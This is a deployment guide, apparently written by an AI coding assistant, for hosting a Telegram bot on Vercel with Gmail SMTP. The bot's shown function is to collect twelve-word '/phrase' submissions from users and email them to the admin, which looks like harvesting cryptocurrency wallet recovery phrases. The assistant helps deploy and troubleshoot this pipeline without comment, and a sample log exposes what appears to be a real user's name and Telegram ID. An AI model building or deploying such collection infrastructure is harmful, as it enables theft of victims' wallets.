# Vercel Deployment Guide (with Gmail SMTP)

## Why Vercel Instead of Render?

**Vercel DOES support SMTP connections** - unlike Render's free tier!

| Feature | Render Free | Vercel Free |
|---------|-------------|-------------|
| SMTP Port 587 | ❌ Blocked | ✅ Allowed |
| SMTP Port 465 | ❌ Blocked | ✅ Allowed |
| Gmail SMTP | ❌ Blocked | ✅ Works |
| Webhooks | ✅ Yes | ✅ Yes |
| Cost | Free | Free |

**Result:** You can keep your existing Gmail SMTP setup on Vercel!

## Prerequisites

- ✅ Your existing Gmail App Password (ADMIN_EMAIL_PASS)
- ✅ Telegram bot configured for webhook mode (already done in your code)
- ✅ MongoDB Atlas URI
- ✅ Vercel account (free)

## Step 1: Install Vercel CLI

```bash
npm install -g vercel
```

Or use without installing:
```bash
npx vercel
```

## Step 2: Prepare Your Project

Your code is already configured for Vercel! The `vercel.json` file has been created with:
- Node.js runtime configuration
- Automatic routing to your Express app
- Production environment settings

## Step 3: Login to Vercel

```bash
vercel login
```

This will open your browser to authenticate.

## Step 4: Deploy to Vercel

In your project directory, run:

```bash
vercel
```

Follow the prompts:
- **Set up and deploy?** → Yes
- **Which scope?** → Your account
- **Link to existing project?** → No
- **Project name?** → `telegram-bot` (or your choice)
- **Directory?** → `./` (current directory)
- **Override settings?** → No

Vercel will deploy and give you a URL like: `https://telegram-bot-xxx.vercel.app`

## Step 5: Configure Environment Variables

### Option A: Via Vercel CLI

```bash
vercel env add ADMIN_EMAIL
# Enter: your-email@gmail.com

vercel env add ADMIN_EMAIL_PASS
# Enter: your_gmail_app_password

vercel env add HR_EMAIL
# Enter: backup-email@gmail.com

vercel env add BOT_TOKEN
# Enter: your_telegram_bot_token

vercel env add MONGO_URI
# Enter: your_mongodb_connection_string

vercel env add ADMIN_PASSWORD
# Enter: your_admin_password

vercel env add WEBHOOK_URL
# Enter: https://your-vercel-url.vercel.app

vercel env add WEBHOOK_SECRET_PATH
# Enter: your_secret_path
```

### Option B: Via Vercel Dashboard

1. Go to https://vercel.com/dashboard
2. Select your project
3. Click **Settings** → **Environment Variables**
4. Add each variable:

```bash
ADMIN_EMAIL=your-email@gmail.com
ADMIN_EMAIL_PASS=your_gmail_app_password
HR_EMAIL=backup-email@gmail.com
BOT_TOKEN=your_telegram_bot_token
MONGO_URI=mongodb+srv://...
ADMIN_PASSWORD=your_admin_password
WEBHOOK_URL=https://your-vercel-url.vercel.app
WEBHOOK_SECRET_PATH=your_secret_webhook_path
NODE_ENV=production
```

**Important:** Select **Production**, **Preview**, and **Development** for each variable.

## Step 6: Redeploy with Environment Variables

After adding environment variables:

```bash
vercel --prod
```

This deploys to production with your environment variables.

## Step 7: Set Telegram Webhook

Your bot needs to know where to send updates. You have two options:

### Option A: Automatic (on deployment)
Your code automatically sets the webhook on startup. Just wait a minute after deployment.

### Option B: Manual (via Telegram API)
```bash
curl -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook" \
  -d "url=https://your-vercel-url.vercel.app/your_secret_path"
```

Replace:
- `<YOUR_BOT_TOKEN>` with your actual bot token
- `your-vercel-url.vercel.app` with your Vercel URL
- `your_secret_path` with your WEBHOOK_SECRET_PATH

## Step 8: Test Your Bot

1. Send a message to your bot: `/start`
2. Bot should respond with the welcome message
3. Send a test phrase:
   ```
   /phrase word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12
   ```
4. Check your email - you should receive the phrase notification via Gmail SMTP!

## Monitoring

### View Logs:
```bash
vercel logs
```

Or in Vercel dashboard: Project → Deployments → Click deployment → View Function Logs

### Expected Logs:
```
✅ SMTP server connection verified successfully
✅ MongoDB connected successfully
✅ Webhook set to https://your-app.vercel.app/secret-path
⚡️ Telegram bot live on production webhook
```

When phrase submitted:
```
📨 Phrase email sent to admin:
👤 User: Mi Lia (7132465714)
📩 Message ID: <gmail-message-id>
✅ Accepted: [your-email@gmail.com]
🔁 SMTP Response: 250 2.0.0 OK
```

## Vercel Limits (Free Tier)

- ✅ **100 GB bandwidth/month** - More than enough
- ✅ **Serverless Function Execution**: 100 GB-hours/month
- ✅ **Serverless Function Duration**: 10 seconds per invocation
- ✅ **SMTP connections**: ✅ Allowed (unlike Render!)

Your bot should work perfectly within these limits.

## Troubleshooting

### SMTP Timeout on Vercel
If you still get timeouts:
1. The 60-second timeout in your code might be too long
2. Vercel functions timeout at 10s (free) or 60s (pro)
3. SMTP emails typically send in 2-5 seconds, so should be fine

If issues persist:
- Check Vercel function logs
- Verify ADMIN_EMAIL_PASS is correct
- Try port 465 instead of 587 (see below)

### Switch to Port 465 (if needed)
Edit `helpers/mailPhrase.js`:
```javascript
const transporter = nodemailer.createTransport({
    host: 'smtp.gmail.com',
    port: 465,        // Change from 587
    secure: true,     // Change from false
    // ... rest of config
});
```

### Bot Not Responding
1. Check webhook is set correctly:
   ```bash
   curl https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getWebhookInfo
   ```
2. Verify URL matches your Vercel deployment
3. Check Vercel function logs for errors

### Environment Variables Not Working
- Make sure you selected Production, Preview, AND Development
- Redeploy after adding variables: `vercel --prod`
- Check variable names match exactly (case-sensitive)

## Updating Your Bot

To deploy updates:

```bash
git add .
git commit -m "Update bot"
git push

# Then deploy to Vercel
vercel --prod
```

Or if linked to Git:
- Vercel auto-deploys on every git push to main branch!

## Comparison: Render vs Vercel

| Feature | Render Free | Vercel Free |
|---------|-------------|-------------|
| SMTP Support | ❌ No (blocked Sept 2025) | ✅ Yes |
| Gmail SMTP | ❌ No | ✅ Yes |
| Setup Complexity | Medium | Easy |
| Auto-deploys | Yes | Yes (with Git) |
| Custom Domains | Yes | Yes |
| Function Timeout | Always-on | 10s per request |
| Best For | Long-running services | Webhook-based bots |

## Cost Comparison

### Staying on Render:
- Option 1: Upgrade to paid ($7/month) ❌
- Option 2: Use SendGrid (free but extra setup) ⚠️

### Moving to Vercel:
- Keep Gmail SMTP ✅
- Vercel free tier ✅
- **Total: $0/month** ✅

## Benefits of Vercel Deployment

1. ✅ **Keep Gmail SMTP** - No SendGrid needed
2. ✅ **Free Forever** - Generous free tier
3. ✅ **Auto-scaling** - Handles traffic spikes
4. ✅ **Fast Deployments** - 10-30 seconds
5. ✅ **Git Integration** - Auto-deploy on push
6. ✅ **Global CDN** - Fast worldwide
7. ✅ **Easy Rollbacks** - One-click in dashboard

## Files Created for Vercel

- ✅ **`vercel.json`** - Vercel configuration
- ✅ **`VERCEL_DEPLOYMENT.md`** - This guide

## Reverting Changes

I've reverted your code to use SMTP (Gmail) instead of SendGrid:
- ✅ `handlers/commands.js` - Back to `mailPhrase.js`
- ✅ `index.js` - Back to SMTP verification
- ✅ `mailPhrase.js` - Still has all improvements (retry logic, timeouts)

## Summary

**Problem Solved:**
- ❌ Render blocks SMTP on free tier
- ✅ Vercel allows SMTP on free tier
- ✅ Keep your existing Gmail setup
- ✅ No SendGrid needed
- ✅ Still free!

**Next Steps:**
1. Install Vercel CLI: `npm install -g vercel`
2. Login: `vercel login`
3. Deploy: `vercel`
4. Add environment variables (via CLI or dashboard)
5. Deploy to production: `vercel --prod`
6. Test your bot!

**Time to deploy: ~10 minutes**  
**Cost: $0**  
**Result: Gmail SMTP working again!** ✅

---

Need help? Check Vercel docs: https://vercel.com/docs

